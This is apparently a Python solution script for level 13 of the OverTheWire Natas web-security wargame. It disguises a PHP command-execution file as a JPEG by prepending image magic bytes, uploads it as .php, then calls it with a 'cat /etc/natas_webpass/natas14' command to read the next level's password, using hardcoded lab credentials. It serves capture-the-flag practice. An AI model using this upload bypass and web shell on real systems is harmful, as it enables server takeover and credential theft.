import requests
import re
import os

b = "ffd8ff"
bytes_ = b.encode("utf-8").fromhex(b)


if not os.path.exists("add_header_jpeg.php"):
    with open("command_exec.php", "rb") as f:
        content = f.read()

    with open("add_header_jpeg.php", "wb") as f:
        f.write(bytes_)
        f.write(content)

username = "natas13"
password = "lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9"
url = "http://natas13.natas.labs.overthewire.org"

r1 = requests.get(url, auth=(username, password))


payload = {"MAX_FILE_SIZE": "1000", "filename": "add_header.php"}

files = {"uploadedfile": open("add_header_jpeg.php", "rb")}

r2 = requests.post(url, auth=(username, password), data=payload, files=files)

content = r2.text
pattern = r"upload/[A-Za-z0-9]+"
replacement = ".php"
directory_name = "/" + re.search(pattern + replacement, content).group()

url_path = url + directory_name + "?c=cat%20/etc/natas_webpass/natas14"


r3 = requests.get(url_path, auth=(username, password))

print("Password to level 14:", r3.text[4:].strip())
